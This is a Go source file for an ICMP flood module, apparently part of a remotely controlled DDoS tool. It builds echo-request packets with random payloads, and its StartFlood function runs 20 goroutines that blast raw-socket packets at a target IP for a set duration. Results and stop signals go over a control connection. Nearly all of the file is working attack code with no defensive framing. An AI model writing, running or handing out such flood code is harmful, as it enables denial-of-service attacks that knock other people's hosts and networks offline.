package icmp

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"syscall"
	"time"

	"go_net/pkg/core"
)

const (
	ICMP_TYPE_ECHO_REQUEST = 8
	ICMP_CODE_ECHO_REQUEST = 0
)

func calculateChecksum(data []byte) uint16 {
	var sum uint32
	length := len(data)

	for i := 0; i < length-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i:]))
	}

	if length%2 == 1 {
		sum += uint32(data[length-1]) << 8
	}

	for sum>>16 > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	return ^uint16(sum)
}

func buildICMPPacket(packetID uint16, seqNum uint16, payloadSize int) []byte {
	packetSize := 8 + payloadSize
	packet := make([]byte, packetSize)

	packet[0] = ICMP_TYPE_ECHO_REQUEST
	packet[1] = ICMP_CODE_ECHO_REQUEST
	binary.BigEndian.PutUint16(packet[2:4], 0) // Checksum initial
	binary.BigEndian.PutUint16(packet[4:6], packetID)
	binary.BigEndian.PutUint16(packet[6:8], seqNum)

	if payloadSize > 0 {
		payload := packet[8:]
		for i := range payload {
			payload[i] = byte(rand.Intn(256))
		}
	}

	checksum := calculateChecksum(packet)
	binary.BigEndian.PutUint16(packet[2:4], checksum)

	return packet
}

func StartFlood(targetIP string, durationSecs int, conn net.Conn) {
	ip := net.ParseIP(targetIP)
	if ip == nil || ip.To4() == nil {
		core.SendResponse(conn, "ERROR: Invalid IPv4 address for ICMP.")
		return
	}
	dstIP := ip.To4()

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	var wg sync.WaitGroup
	numThreads := 20

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()

			fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP) // i think IPPROTO_ICMP is deprecated so use smth else ig
			if err != nil {
				if threadID == 0 {
					core.SendResponse(conn, fmt.Sprintf("ERROR: ICMP Socket creation failed: %v", err))
				}
				return
			}
			defer syscall.Close(fd)

			addr := syscall.SockaddrInet4{
				Port: 0,
			}
			copy(addr.Addr[:], dstIP)

			r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(threadID)))

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				for j := 0; j < 100; j++ {
					packetID := uint16(r.Intn(65535))
					seqNum := uint16(j)
					pkt := buildICMPPacket(packetID, seqNum, 64)

					_ = syscall.Sendto(fd, pkt, 0, &addr)
				}
				time.Sleep(1 * time.Millisecond)
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: ICMP Flood on %s completed.", targetIP))
}
